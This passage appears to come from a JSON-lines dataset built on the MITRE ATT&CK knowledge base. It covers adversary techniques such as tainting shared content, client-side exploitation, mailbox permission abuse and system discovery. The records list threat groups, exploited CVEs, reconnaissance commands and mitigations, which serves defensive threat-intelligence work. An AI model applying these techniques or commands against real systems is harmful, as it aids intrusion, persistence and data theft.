"Kimsuky has obfuscated binary strings including the use of XOR encryption and Base64 encoding.", "Many strings in JHUHUGIT are obfuscated with a XOR algorithm.", "AppleSeed has the ability to Base64 encode its payload and custom encrypt API calls.", "ComRAT has used encryption and base64 to obfuscate its orchestrator code in the Registry. ComRAT has also embedded an XOR encrypted communications module inside the orchestrator module. ComRAT has encrypted its virtual file system using AES-256 in XTS mode and has encoded PowerShell scripts. ", "Raindrop encrypted its payload using a simple XOR algorithm with a single-byte key.", "Industroyer uses heavily obfuscated code in its Windows Notepad backdoor.", "Matryoshka obfuscates API function names using a substitute cipher combined with Base64 encoding.", "SUNBURST strings were compressed and encoded in Base64. SUNBURST also obfuscated collected system information using a FNV-1a + XOR algorithm.", "Machete has used pyobfuscate, zlib compression, and base64 encoding for obfuscation. Machete has also used some visual obfuscation techniques by naming variables as combinations of letters to hinder analysis.", "Leafminer obfuscated scripts that were used on victim machines.", "The Helminth config file is encrypted with RC4.", "RTM strings, network data, configuration, and modules are encrypted with a modified RC4 algorithm. RTM has also been delivered to targets as various archive files including ZIP, 7-ZIP, and RAR.", "LoudMiner has obfuscated various scripts and encrypted DMG files.\t", "Ursnif has used an XOR-based algorithm to encrypt Tor clients dropped to disk.\tUrsnif droppers have also been delivered as password-protected zip files that execute base64 encoded PowerShell commands.", "AppleJeus has XOR-encrypted collected system information prior to sending to a C2. AppleJeus has also used the open source ADVObfuscation library for its components.", "GrimAgent has used Rotate on Right (RoR) and Rotate on Left (RoL) functionality to encrypt strings.", "Emotet has obfuscated macros within malicious documents to hide the URLs hosting the malware,  CMD.exe arguments, and PowerShell scripts. ", "Whitefly has encrypted the payload used for C2.\t", "TEARDROP created and read from a file with a fake JPG header, and its payload was encrypted with a simple rotating XOR cipher.", "Molerats has delivered compressed executables within ZIP files to victims.", "Consider utilizing the Antimalware Scan Interface (AMSI) on Windows 10 to analyze commands after being processed/interpreted. ", "H1N1 uses multiple techniques to obfuscate strings, including XOR.", "Rifdoor has encrypted strings with a single byte XOR algorithm.", "FinFisher is heavily obfuscated in many ways, including through the use of spaghetti code in its functions in an effort to confuse disassembly programs. It also uses a custom XOR algorithm to obfuscate code."], "is_subtechnique": false}
{"text": " Adversaries may gather employee names that can be used during targeting. Employee names be used to derive email addresses as well as to help guide other reconnaissance efforts and/or craft more-believable lures. Adversaries may easily gather employee names, since they may be readily available and exposed via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: OPM Leak) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566) or [Valid Accounts](https://attack.mitre.org/techniques/T1078)).", "idx": "https://attack.mitre.org/techniques/T1589/003", "title": "Employee Names", "entity": "Employee Names", "entity_type": "techniques", "entity_context": ["This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties.", "Sandworm Team's research of potential victim organizations included the identification and collection of employee information.", "Silent Librarian has collected lists of names for individuals from targeted organizations."], "is_subtechnique": true}
{"text": " Adversaries may grant additional permission levels, such as ReadPermission or FullAccess, to maintain persistent access to an adversary-controlled email account. The <code>Add-MailboxPermission</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlet, available in on-premises Exchange and in the cloud-based service Office 365, adds permissions to a mailbox.(Citation: Microsoft - Add-MailboxPermission)(Citation: FireEye APT35 2018)(Citation: Crowdstrike Hiding in Plain Sight 2018) Adversaries may also assign mailbox folder permissions through individual folder permissions or roles. Adversaries may assign the Default or Anonymous user permissions or roles to the Top of Information Store (root), Inbox, or other mailbox folders. By assigning one or both user permissions to a folder, the adversary can utilize any other account in the tenant to maintain persistence to the target user’s mail folders.(Citation: Remediation and Hardening Strategies for Microsoft 365 to Defend Against UNC2452) This may be used in persistent threat incidents as well as BEC (Business Email Compromise) incidents where an adversary can assign more access rights to the accounts they wish to compromise. This may further enable use of additional techniques for gaining access to systems. For example, compromised business accounts are often used to send messages to other accounts in the network of the target business while creating inbox rules (ex: [Internal Spearphishing](https://attack.mitre.org/techniques/T1534)), so the messages evade spam/phishing detection mechanisms.(Citation: Bienstock, D. - Defending O365 - 2019)", "idx": "https://attack.mitre.org/techniques/T1098/002", "title": "Exchange Email Delegate Permissions", "entity": "Exchange Email Delegate Permissions", "entity_type": "techniques", "entity_context": ["Do not allow domain administrator accounts to be used for day-to-day operations that may expose them to potential adversaries on unprivileged systems.", "Magic Hound granted compromised email accounts read access to the email boxes of additional targeted accounts. The group then was able to authenticate to the intended victim's OWA (Outlook Web Access) portal and read hundreds of email communications for information on Middle East organizations. ", "APT29 added their own devices as allowed IDs for active sync using <code>Set-CASMailbox</code>, allowing it to obtain copies of victim mailboxes. It also added additional permissions (such as Mail.Read and Mail.ReadWrite) to compromised Application or Service Principals.", "APT28 has used a Powershell cmdlet to grant the <code>ApplicationImpersonation</code> role to a compromised account.", "Use multi-factor authentication for user and privileged accounts."], "is_subtechnique": true}
{"text": " Adversaries may execute active reconnaissance scans to gather information that can be used during targeting. Active scans are those where the adversary probes victim infrastructure via network traffic, as opposed to other forms of reconnaissance that do not involve direct interaction. Adversaries may perform different forms of active scanning depending on what information they seek to gather. These scans can also be performed in various ways, including using native features of network protocols such as ICMP.(Citation: Botnet Scan)(Citation: OWASP Fingerprinting) Information from these scans may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190)).", "idx": "https://attack.mitre.org/techniques/T1595", "title": "Active Scanning", "entity": "Active Scanning", "entity_type": "techniques", "entity_context": ["This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."], "is_subtechnique": false}
{"text": " Adversaries may deliver payloads to remote systems by adding content to shared storage locations, such as network drives or internal code repositories. Content stored on network drives or in other shared locations may be tainted by adding malicious programs, scripts, or exploit code to otherwise valid files. Once a user opens the shared tainted content, the malicious portion can be executed to run the adversary's code on a remote system. Adversaries may use tainted shared content to move laterally. A directory share pivot is a variation on this technique that uses several other techniques to propagate malware when users access a shared network directory. It uses [Shortcut Modification](https://attack.mitre.org/techniques/T1547/009) of directory .LNK files that use [Masquerading](https://attack.mitre.org/techniques/T1036) to look like the real directories, which are hidden through [Hidden Files and Directories](https://attack.mitre.org/techniques/T1564/001). The malicious .LNK-based directories have an embedded command that executes the hidden malware file in the directory and then opens the real intended directory so that the user's expected action still occurs. When used with frequently used network directories, the technique may result in frequent reinfections and broad access to systems and potentially to new and higher privileged accounts. (Citation: Retwin Directory Share Pivot) Adversaries may also compromise shared network directories through binary infections by appending or prepending its code to the healthy binary on the shared network directory. The malware may modify the original entry point (OEP) of the healthy binary to ensure that it is executed before the legitimate code. The infection could continue to spread via the newly infected file when it", "idx": "https://attack.mitre.org/techniques/T1080", "title": "Taint Shared Content", "entity": "Taint Shared Content", "entity_type": "techniques", "entity_context": ["BRONZE BUTLER has placed malware on file shares and given it the same name as legitimate documents on the share.", "Stuxnet infects remote servers via network shares and by infecting WinCC database views with malicious code.", "H1N1 has functionality to copy itself to network shares.", "Darkhotel used a virus that propagates by infecting executables stored on shared drives.", "Ramsay can spread itself by infecting other portable executable files on networks shared drives.\t", "Conti can spread itself by infecting other remote machines via network shared drives. ", "Ursnif has copied itself to and infected files in network drives for propagation.", "Miner-C copies itself into the public folder of Network Attached Storage (NAS) devices and infects new victims who open the file.", "Gamaredon Group has injected malicious macros into all Word and Excel documents on mapped network drives.", "InvisiMole can replace legitimate software or documents in the compromised network with their trojanized versions, in an attempt to propagate itself within the network.", "Identify potentially malicious software that may be used to taint content or may result from it and audit and/or block the unknown programs by using application control  tools, like AppLocker,   or Software Restriction Policies  where appropriate. ", "Protect shared folders by minimizing users who have write access.", "Use utilities that detect or mitigate common features used in exploitation, such as the Microsoft Enhanced Mitigation Experience Toolkit (EMET)."], "is_subtechnique": false}
{"text": " Adversaries may exploit software vulnerabilities in client applications to execute code. Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility. Several types exist: ### Browser-based Exploitation Web browsers are a common target through [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) and [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002). Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser. These often do not require an action by the user for the exploit to be executed. ### Office Applications Common office and productivity applications such as Microsoft Office are also targeted through [Phishing](https://attack.mitre.org/techniques/T1566). Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run. ### Common Third-party Applications Other applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash,", "idx": "https://attack.mitre.org/techniques/T1203", "title": "Exploitation for Client Execution", "entity": "Exploitation for Client Execution", "entity_type": "techniques", "entity_context": ["TA459 has exploited Microsoft Word vulnerability CVE-2017-0199 for execution.", "Elderwood has used exploitation of endpoint software, including Microsoft Internet Explorer Adobe Flash vulnerabilities, to gain execution. They have also used zero-day exploits.", "APT12 has exploited multiple vulnerabilities for execution, including Microsoft Office vulnerabilities (CVE-2009-3129, CVE-2012-0158) and vulnerabilities in Adobe Reader and Flash (CVE-2009-4324, CVE-2009-0927, CVE-2011-0609, CVE-2011-0611).", "HAFNIUM has exploited CVE-2021-26855, CVE-2021-26857, CVE-2021-26858, and CVE-2021-27065  to compromise on-premises versions of Microsoft Exchange Server, enabling access to email accounts and installation of additional malware.", "APT3 has exploited the Adobe Flash Player vulnerability CVE-2015-3113 and Internet Explorer vulnerability CVE-2014-1776.", "Cobalt Strike can exploit Oracle Java vulnerabilities for execution, including CVE-2011-3544, CVE-2013-2465, CVE-2012-4681, and CVE-2013-2460.", "Frankenstein has used CVE-2017-11882 to execute code on the victim's machine.", "Browser sandboxes can be used to mitigate some of the impact of exploitation, but sandbox escapes may still exist.  \n\nOther types of virtualization and application microsegmentation may also mitigate the impact of client-side exploitation. Risks of additional exploits and weaknesses in those systems may still exist. ", "Transparent Tribe has crafted malicious files to exploit CVE-2012-0158 and CVE-2010-3333 for execution.", "APT28 has exploited Microsoft Office vulnerability CVE-2017-0262 for execution.", "Bankshot leverages a known zero-day vulnerability in Adobe Flash to execute the implant into the victims’ machines.", "EvilBunny has exploited CVE-2011-4369, a vulnerability in the PRC component in Adobe Reader.", "InvisiMole has installed legitimate but vulnerable Total Video Player software and wdigest.dll library drivers on compromised hosts to exploit stack overflow and input validation vulnerabilities for code execution.", "Tropic Trooper has executed commands through Microsoft security vulnerabilities, including CVE-2017-11882, CVE-2018-0802, and CVE-2012-0158.", "Agent Tesla has exploited Office vulnerabilities such as CVE-2017-11882 and CVE-2017-8570 for execution during delivery. ", "APT41 leveraged the follow exploits in their operations: CVE-2012-0158, CVE-2015-1641, CVE-2017-0199, CVE-2017-11882, and CVE-2019-3396. ", "SUPERNOVA was installed via exploitation of a SolarWinds Orion API authentication bypass vulnerability (CVE-2020-10148).", "Sandworm Team has exploited vulnerabilities in Microsoft PowerPoint via OLE objects (CVE-2014-4114) and Microsoft Word via crafted TIFF images (CVE-2013-3906).", "SpeakUp attempts to exploit the following vulnerabilities in order to execute its malicious script: CVE-2012-0874, CVE-2010-1871, CVE-2017-10271, CVE-2018-2894, CVE-2016-3088, JBoss AS 3/4/5/6, and the Hadoop YARN ResourceManager. ", "APT32 has used RTF document that includes an exploit to execute malicious code. (CVE-2017-11882)", "Security applications that look for behavior used during exploitation such as Windows Defender Exploit Guard (WDEG) and the Enhanced Mitigation Experience Toolkit (EMET) can be used to mitigate some exploitation behavior.  Control flow integrity checking is another way to potentially identify and stop a software exploit from occurring.  Many of these protections depend on the architecture and target application binary for compatibility.", "Mustang Panda has exploited CVE-2017-0199 in Microsoft Word to execute code.", "APT33 has attempted to exploit a known vulnerability in WinRAR (CVE-2018-20250), and attempted to gain remote code execution via a security bypass vulnerability (CVE-2017-11774).", "Sidewinder has exploited vulnerabilities to gain execution including CVE-2017-11882 and CVE-2020-0674.", " The White Company has taken advantage of a known vulnerability in Microsoft Word (CVE 2012-0158) to execute code.", "APT29 has used multiple software exploits for common client software, like Microsoft Word, Exchange, and Adobe Reader, to gain code execution.", "Higaisa has exploited CVE-2018-0798 for execution.", "Leviathan has exploited multiple Microsoft Office and .NET vulnerabilities for execution, including CVE-2017-0199, CVE-2017-8759, and CVE-2017-11882.", "admin@338 has exploited client software vulnerabilities for execution, such as Microsoft Word CVE-2012-0158.", "Xbash can attempt to exploit known vulnerabilities in Hadoop, Redis, or ActiveMQ when it finds those services running in order to conduct further execution.", "Darkhotel has exploited Adobe Flash vulnerability CVE-2015-8651 for execution.", "Inception has exploited CVE-2012-0158, CVE-2014-1761, CVE-2017-11882 and CVE-2018-0802 for execution.", "Lazarus Group has exploited Adobe Flash vulnerability CVE-2018-4878 for execution.", "Cobalt Group had exploited multiple vulnerabilities for execution, including Microsoft’s Equation Editor (CVE-2017-11882), an Internet Explorer vulnerability (CVE-2018-8174), CVE-2017-8570, CVE-2017-0199, and CVE-2017-8759.", "MuddyWater has exploited the Office vulnerability CVE-2017-0199 for execution.", "BRONZE BUTLER has exploited Microsoft Office vulnerabilities CVE-2014-4114, CVE-2018-0802, and CVE-2018-0798 for execution.", "BlackTech has exploited multiple vulnerabilities for execution, including Microsoft Office vulnerabilities CVE-2012-0158, CVE-2014-6352, CVE-2017-0199, and Adobe Flash CVE-2015-5119.", "Patchwork uses malicious documents to deliver remote execution exploits as part of. The group has previously exploited CVE-2017-8570, CVE-2012-1856, CVE-2014-4114, CVE-2017-0199, CVE-2017-11882, and CVE-2015-1641.", "Andariel has exploited numerous ActiveX vulnerabilities, including zero-days.", "DealersChoice leverages vulnerable versions of Flash to perform execution.", "APT37 has used exploits for Flash Player (CVE-2016-4117, CVE-2018-4878), Word (CVE-2017-0199), Internet Explorer (CVE-2020-1380 and CVE-2020-26411), and Microsoft Edge (CVE-2021-26411) for execution.", "Threat Group-3390 has exploited the Microsoft SharePoint vulnerability CVE-2019-0604.", "Tonto Team has exploited Microsoft vulnerabilities, including CVE-2018-8174, CVE-2018-0802, and CVE-2017-11882, as well as other vulnerabilities such as CVE-2019-9489 and CVE-2020-8468, to enable execution of their delivered malicious payloads.", "Ramsay has been embedded in documents exploiting CVE-2017-0199, CVE-2017-11882, and CVE-2017-8570.", "HAWKBALL has exploited Microsoft Office vulnerabilities CVE-2017-11882 and CVE-2018-0802 to deliver the payload. "], "is_subtechnique": false}
{"text": " An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from [System Information Discovery](https://attack.mitre.org/techniques/T1082) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions. Tools such as [Systeminfo](https://attack.mitre.org/software/S0096) can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the <code>systemsetup</code> configuration tool on macOS. As an example, adversaries with user-level access can execute the <code>df -aH</code> command to obtain currently mounted disks and associated freely available space. [System Information Discovery](https://attack.mitre.org/techniques/T1082) combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.(Citation: OSX.FairyTale)(Citation: 20 macOS Common Tools and Techniques) Infrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.(Citation: Amazon Describe Instance)(Citation: Google Instances Resource)(Citation: Microsoft Virutal Machine API)", "idx": "https://attack.mitre.org/techniques/T1082", "title": "System Information Discovery", "entity": "System Information Discovery", "entity_type": "techniques", "entity_context": ["SOUNDBITE is capable of gathering system information.", "PowerDuke has commands to get information about the victim's name, build, version, serial number, and memory usage.", "A Gamaredon Group file stealer can gather the victim's computer name and drive serial numbers to send to a C2 server.", "APT29 used <code>fsutil</code> to check available free space before executing actions that might create large files on disk.", "BLUELIGHT has collected the computer name and OS version from victim machines.", "Astaroth collects the machine name and keyboard language from the system. ", "AppleJeus has collected the victim host information after infection.", "Rifdoor has the ability to identify the Windows version on the compromised host.", "Shamoon obtains the victim's operating system version and keyboard layout and sends the information to the C2 server.", "PLAINTEE collects general system enumeration data about the infected machine and checks the OS version.", "RogueRobin gathers BIOS versions and manufacturers, the number of CPU cores, the total physical memory, and the computer name.", "XAgentOSX contains the getInstalledAPP function to run <code>ls -la /Applications</code> to gather what applications are installed.", "Blue Mockingbird has collected hardware details for the victim's system, including CPU and memory information.", "The initial beacon packet for Mis-Type contains the operating system version and file system of the victim.", "SombRAT can execute <code>getinfo</code> to enumerate the computer name and OS version of a compromised system.", "DustySky extracts basic information about the operating system.", "Pony has collected the Service Pack, language, and region information to send to the C2.\t", "DarkComet can collect the computer name, RAM used, and operating system version from the victim’s machine.", "Grandoreiro can collect the computer name and OS version from a compromised host.", "Inception has used a reconnaissance module to gather information about the operating system and hardware on the infected host.", "TAINTEDSCRIBE can use <code>DriveList</code> to retrieve drive information.", "SMOKEDHAM has used the <code>systeminfo</code> command on a compromised host.", "Babuk can enumerate disk volumes, get disk information, and query service status.", "SpicyOmelette can identify the system name of a compromised host.", "SLOWDRIFT collects and sends system information to its C2.", "StrongPity can identify the hard disk volume serial number on a compromised host.", "Get2 has the ability to identify the computer name and Windows version of an infected host.", "Remsec can obtain the OS version information, computer name, processor architecture, machine role, and OS edition.", "OSX_OCEANLOTUS.D collects processor information, memory information, computer name, hardware UUID, serial number, and operating system version. OSX_OCEANLOTUS.D has used the <code>ioreg</code> command to gather some of this information.", "Ixeshe collects the computer name of the victim's system during the initial infection.", "Valak can determine the Windows version and computer name on a compromised host.", "APT38 has attempted to get detailed information about a compromised host, including the operating system, version, patches, hotfixes, and service packs.", "PinchDuke gathers system configuration information.", "Pasam creates a backdoor through which remote attackers can retrieve information such as hostname and free disk space.", "Okrum can collect computer name, locale information, and information about the OS and architecture.", "yty gathers the computer name, the serial number of the main disk volume, CPU information, Microsoft Windows version, and runs the command <code>systeminfo</code>.", "PoshC2 contains modules, such as <code>Get-ComputerInfo</code>, for enumerating common system information.", "Proxysvc collects the OS version, country name, MAC address, computer name, physical memory statistics, and volume information for all drives on the system.", "PowerShower has collected system information on the infected host.", "APT18 can collect system information from the victim’s machine.", "WinMM collects the system name, OS version including service pack, and system install date and sends the information to the C2 server.", "Netwalker can determine the system architecture it is running on to choose which version of the DLL to use.", "OceanSalt can collect the computer name from the system.", "More_eggs has the capability to gather the OS version and computer name.", "Nebulae can discover logical drive information including the drive type, free space, and volume information.", "APT32 has collected the OS version and computer name from victims. One of the group's backdoors can also query the Windows Registry to gather system information, and another macOS backdoor performs a fingerprint of the machine on its first connection to the C&C server. APT32 executed shellcode to identify the name of the infected host.", "4H RAT sends an OS version identifier in its beacons.", "KARAE can collect system information.", "Metamorfo has collected the hostname and operating system version from the compromised host.", "ZeroT gathers the victim's computer name, Windows version, and system language, and then sends it to its C2 server.", "During its initial execution, BACKSPACE extracts operating system information from the infected host.", "zwShell can obtain the victim PC name and OS version.", "UPPERCUT has the capability to gather the system’s hostname and OS version.", "Comnie collects the hostname of the victim machine.", "SHUTTERSPEED can collect system information.", "BoomBox can enumerate the hostname, domain, and IP of a compromised host.", "Darkhotel has collected the hostname, OS version, service pack version, and the processor architecture from the victim’s machine.", "Stuxnet collects system information including computer and domain names, OS version, and S7P paths.", "ObliqueRAT has the ability to check for blocklisted computer names on infected endpoints.", "JPIN can obtain system information such as OS version and disk space.", "NanHaiShu can gather the victim computer name and serial number.", "APT37 collects the computer name, the BIOS model, and execution path.", "Orz can gather the victim OS version and whether it is 64 or 32 bit.", "Naid collects a unique identifier (UID) from a compromised host.", "Systeminfo can be used to gather information about the operating system.", "APT19 collected system architecture information. APT19 used an HTTP malware variant and a Port 22 malware variant to gather the hostname and CPU information from the victim’s machine.", "MirageFox can collect CPU and architecture information from the victim’s machine.", "Wizard Spider has used “systeminfo” and similar commands to acquire detailed configuration information of a victim machine.", "Operation Wocao has discovered the local disks attached to the system and their hardware information including manufacturer and model, as well as the OS versions of systems connected to a targeted network.", "Sandworm Team used a backdoor to enumerate information about the infected system's operating system.\t", "BLINDINGCAN has collected from a victim machine the system name, processor information, OS version, and disk information, including type and free space available.", "XCSSET identifies the macOS version and uses <code>ioreg</code> to determine serial number.", "admin@338 actors used the following commands after exploiting a machine with LOWBALL malware to obtain information about the OS: <code>ver >> %temp%\\download</code> <code>systeminfo >> %temp%\\download</code>", "Azorult can collect the machine information, system architecture, the OS version, computer name, Windows product name, the number of CPU cores, video card information, and the system language.", "Agent Tesla can collect the system's computer name and also has the capability to collect information on the processor, memory, OS, and video card from the system.", "InvisiMole can gather information on the mapped drives, OS version, computer name, DEP policy, memory size, and system volume serial number.", "OopsIE checks for information on the CPU fan, temperature, mouse, hard disk, and motherboard as part of its anti-VM checks.", "Brave Prince collects hard drive content and system configuration information.", "FALLCHILL can collect operating system (OS) version information, processor information, system name, and information about installed disks from the victim.", "GRIFFON has used a reconnaissance module that can be used to retrieve information about a victim's computer, including the resolution of the workstation .", "Avenger has the ability to identify the host volume ID and the OS architecture on a compromised host.", "SYSCON has the ability to use Systeminfo to identify system information.", "HALFBAKED can obtain information about the OS, processor, and BIOS.", "GoldenSpy has gathered operating system information.\t", "RTM can obtain the computer name, OS version, and default language identifier.", "jRAT collects information about the OS (version, build type, install date) as well as system up-time upon receiving a connection from a backdoor.", "down_new has the ability to identify the system volume information of a compromised host.", "Ursnif has used Systeminfo to gather system information.", "Revenge RAT collects the CPU information, OS information, and system language.", "Bonadan has discovered the OS version, CPU model, and RAM size of the system it has been installed on.", "TURNEDUP is capable of gathering system information.", "Kimsuky has gathered information about the infected computer.", "Crimson contains a command to collect the victim PC name, disk drive information, and operating system.", "Tropic Trooper has detected a target system’s OS version and system volume information.", "Lucifer can collect the computer name, system architecture, default language, and processor frequency of a compromised host.", "Final1stspy obtains victim Microsoft Windows version information and CPU architecture.", "BUBBLEWRAP collects system information, including the operating system version and hostname.", "MobileOrder has a command to upload to its C2 server victim mobile device information, including IMEI, IMSI, SIM card serial number, phone number, Android version, and other information.", "KONNI can gather the OS version, architecture information, connected drives, hostname, and computer name from the victim’s machine and has used systeminfo.exe to get a snapshot of the current system state of the target machine.", "BlackEnergy has used Systeminfo to gather the OS version, as well as information on the system configuration, BIOS, the motherboard, and the processor.", "HELLOKITTY can enumerate logical drives on a target system.", "GravityRAT collects the MAC address, computer name, and CPU information.", "ZLib has the ability to enumerate system information.", "Rocke has used uname -m to collect the name and information about the infected system's kernel.", "PipeMon can collect and send OS version and computer name as a part of its C2 beacon.", "Egregor can perform a language check of the infected system and can query the CPU information (cupid).", "BADCALL collects the computer name and host name on the compromised system.", "ShimRatReporter gathered the operating system name and specific Windows version of an infected machine.", "Empire can enumerate host system information like OS, architecture, applied patches, and more.", "NDiskMonitor obtains the victim computer name and encrypts the information to send over its C2 channel.", "Unknown Logger can obtain information about the victim computer name, physical memory, country, and date.", "Turla surveys a system upon check-in to discover operating system configuration details using the <code>systeminfo</code> and <code>set</code> commands.", "ADVSTORESHELL can run Systeminfo to gather information about the victim.", "Windshift has used malware to identify the computer name of a compromised host.", "KGH_SPY can collect drive information from a compromised host.", "REvil can identify the username, machine name, system language, keyboard layout, OS version, and system drive information on a compromised host.", "Ramsay can detect system information--including disk names, total space, and remaining space--to create a hardware profile GUID which acts as a system identifier for operators.\t", "Bundlore will enumerate the macOS version to determine which follow-on behaviors to execute using <code>/usr/bin/sw_vers -productVersion</code>.", "DEATHRANSOM can enumerate logical drives on a target system.", "The initial beacon packet for Misdat contains the operating system version of the victim.", "Fysbis has used the command <code>ls /etc | egrep -e\"fedora\\*|debian\\*|gentoo\\*|mandriva\\*|mandrake\\*|meego\\*|redhat\\*|lsb-\\*|sun-\\*|SUSE\\*|release\"</code> to determine which Linux OS version is running.", "WINERACK can gather information about the host.", "VERMIN collects the OS name, machine name, and architecture information.", "PUNCHBUGGY can gather system information such as computer names.\t", "Spark can collect the hostname, keyboard layout, and language from the system. ", "Rising Sun can detect the computer name, operating system, and other native system information.\t", "Sowbug obtained OS version and hardware configuration from a victim.", "The initial beacon packet for S-Type contains the operating system version and file system of the victim.", "Higaisa collected the system volume serial number, GUID, and computer name.", "SpeakUp uses the <code>cat /proc/cpuinfo | grep -c “cpu family” 2>&1</code> command to gather system information. ", "SHARPSTATS has the ability to identify the IP address, machine name, and OS of the compromised host.", "Several Lazarus Group malware families collect information on the type and version of the victim OS, as well as the victim computer name and CPU information. A Destover-like variant used by Lazarus Group also collects disk space information and sends it to its C2 server..", "Backdoor.Oldrea collects information about the OS and computer name.", "Zebrocy collects the OS version, computer name and serial number for the storage volume C:\\. Zebrocy also runs the <code>systeminfo</code> command to gather system information. ", "SodaMaster can enumerate the host name and OS version on a target system.", "FatDuke can collect the user name, Windows version, computer name, and available space on discs from a compromised host.", "Magic Hound malware has used a PowerShell command to check the victim system architecture to determine if it is an x64 machine. Other malware has obtained the OS version, UUID, and computer/host name to send to the C2 server.", "RedLeaves can gather extended system information including the hostname, OS version number, platform, memory information, time elapsed since system startup, and CPU information.", "Honeybee gathers computer name and information using the <code>systeminfo</code> command.", "njRAT enumerates the victim operating system and computer name during the initial infection.", "Carberp has collected the operating system version from the infected system.", "BADFLICK has captured victim computer name, memory space, and CPU details.", "PoetRAT has the ability to gather information about the compromised host.", "Frankenstein has enumerated hosts, looking for the system's machine name.", "Dyre has the ability to identify the computer name, OS version, and hardware configuration on a compromised host.", "KOMPROGO is capable of retrieving information about the infected system.", "Pupy can grab a system’s information including the OS version, architecture, etc.", "SDBbot has the ability to identify the OS version, country code, and computer name.", "Chimera has used <code>fsutil</code>, <code>fsinfo drives systeminfo</code>, and <code>vssadmin list shadows</code> for sytesm information including shadow volumes and drive information.", "OSX/Shlayer collects the IOPlatformUUID, session UID, and the OS version using the command <code>sw_vers -productVersion</code>.", "Octopus can collect system drive information, the computer name, and the size of the disk.", "POWRUNER may collect information about the system by running <code>hostname</code> and <code>systeminfo</code> on a victim.", "ShadowPad has discovered system information including memory status, CPU frequency, OS versions, and volume serial numbers.", "Cuba can enumerate local drives, disk type, and disk free space.", "Cadelspy has the ability to discover information about the compromised host.", "DownPaper collects the victim host name and serial number, and then sends the information to the C2 server.", "Gold Dragon collects endpoint information using the <code>systeminfo</code> command.", "Trojan.Karagany can capture information regarding the victim's OS, security, and hardware configuration.", "SslMM sends information to its hard-coded C2, including OS version, service pack information, processor speed, system name, and OS install date.", "LoudMiner has monitored CPU usage.\t", "EnvyScout can determine whether the ISO payload was received by a Windows or iOS device.", "TajMahal has the ability to identify hardware information, the computer name, and OS information on an infected host.", "MiniDuke can gather the hostname on a compromised machine.", "CORESHELL collects hostname, volume serial number and OS version data from the victim and sends the information to its C2 server.", "build_downer has the ability to send system volume information to C2.", "Zeus Panda collects the OS version, system architecture, computer name, product ID, install date, and information on the keyboard mapping to determine the language used on the system.", "Kasidet has the ability to obtain a victim's system name and operating system version.", "Caterpillar WebShell has a module to gather information from the compromrised asset, including the computer version, computer name, IIS version, and more. ", "KEYMARBLE has the capability to collect the computer name, language settings, the OS version, CPU information, disk devices, and time elapsed since system start.", "Maze has checked the language of the infected system using the \"GetUSerDefaultUILanguage\" function.", "OilRig has run <code>hostname</code> and <code>systeminfo</code> on a victim.\t", "MuddyWater has used malware that can collect the victim’s OS version and machine name.", "Bankshot gathers system information, network addresses, disk type, disk free space, and the operation system version.", "RunningRAT gathers the OS version, logical drives information, processor information, and volume information.", "Pay2Key has the ability to gather the hostname of the victim machine.", "can collect system information, including computer name, system manufacturer, IsDebuggerPresent state, and execution path.", "gh0st RAT has gathered system architecture, processor, OS configuration, and installed hardware information.", "Mustang Panda has gathered system information using <code>systeminfo</code>.", "Emissary has the capability to execute ver and systeminfo commands.", "FlawedAmmyy beacons out the victim operating system and computer name during the initial infection.", "SoreFang can collect the hostname, operating system configuration, product ID, and disk space on victim machines by executing Systeminfo.", "Explosive has collected the computer name from the infected host. ", "Reaver collects system information from the victim, including CPU speed, computer name, volume serial number, ANSI code page, OEM code page identifier for the OS, Microsoft Windows version, and memory information.", "ZIRCONIUM has used a tool to capture the processor architecture of a compromised host in order to register it with C2.", "HOPLIGHT has been observed collecting victim machine information like OS version, drivers, volume information and more.", "KeyBoy can gather extended system information, such as information about the operating system, disks, and memory.", "Cardinal RAT can collect the hostname, Microsoft Windows version, and processor architecture from a victim machine.", "Derusbi gathers the name of the local host, version of GNU Compiler Collection (GCC), and the system information about the CPU, machine, and operating system.", "HotCroissant has the ability to determine if the current user is an administrator, Windows product name, processor name, screen resolution, and physical RAM of the infected host.", "Epic collects the OS version, hardware information, computer name, available system memory status, disk space information, and system and user language settings.", "Attor monitors the free disk space on the system.", "StoneDrill has the capability to discover the system OS, Windows version, architecture and environment.\t", 